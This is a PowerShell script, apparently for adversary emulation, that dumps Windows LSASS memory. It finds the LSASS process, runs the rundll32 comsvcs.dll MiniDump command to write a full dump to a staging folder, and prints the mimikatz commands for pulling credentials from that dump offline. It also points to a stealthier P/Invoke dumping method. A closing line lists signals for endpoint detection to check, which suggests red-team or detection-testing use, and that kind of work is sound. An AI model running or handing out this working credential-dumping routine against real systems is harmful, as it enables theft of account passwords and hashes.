$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting Credential Access - comsvcs.dll LSASS Dump..." -ForegroundColor Cyan

# T1003.001 - OS Credential Dumping: LSASS Memory
# Uses native Windows DLL (comsvcs.dll) to dump LSASS - no external tools needed

Write-Host "[*] [T1003.001] LSASS dump via comsvcs.dll MiniDump" -ForegroundColor Yellow
Write-Host "[!] Requires: Local Administrator + SeDebugPrivilege" -ForegroundColor Yellow

$dumpDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $dumpDir -Force | Out-Null

# Step 1: Enable SeDebugPrivilege
Write-Host "`n[*] [T1134] Checking current privileges..."
whoami /priv | Select-String "SeDebugPrivilege"

# Step 2: Find LSASS PID
Write-Host "`n[*] Locating LSASS process..."
$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
    Write-Host "[+] LSASS found: PID $($lsass.Id)" -ForegroundColor Green
    
    # Step 3: Dump via rundll32 + comsvcs.dll
    $dumpPath = "$dumpDir\lsass_dump.dmp"
    Write-Host "`n[*] [T1003.001] Dumping LSASS via comsvcs.dll MiniDump..."
    Write-Host "    CMD: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full"
    
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id $dumpPath full

    Start-Sleep -Seconds 3
    
    if (Test-Path $dumpPath) {
        $size = [math]::Round((Get-Item $dumpPath).Length / 1MB, 2)
        Write-Host "[+] LSASS dump successful: $dumpPath ($size MB)" -ForegroundColor Green
        Write-Host "[!] Extract creds offline: mimikatz `"sekurlsa::minidump $dumpPath`" `"sekurlsa::logonpasswords`"" -ForegroundColor Yellow
    } else {
        Write-Host "[-] Dump failed - may require elevated privileges or EDR blocked it" -ForegroundColor Red
    }
} else {
    Write-Host "[-] Cannot find LSASS process" -ForegroundColor Red
}

# Alternative: dump via PowerShell MiniDumpWriteDump
Write-Host "`n[*] Alternative method: PowerShell MiniDumpWriteDump API..."
Write-Host "    This uses direct API calls through P/Invoke - harder to detect"

Write-Host "`n[+] comsvcs.dll LSASS Dump Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: rundll32 accessing LSASS, comsvcs.dll, MiniDump creation" -ForegroundColor Yellow
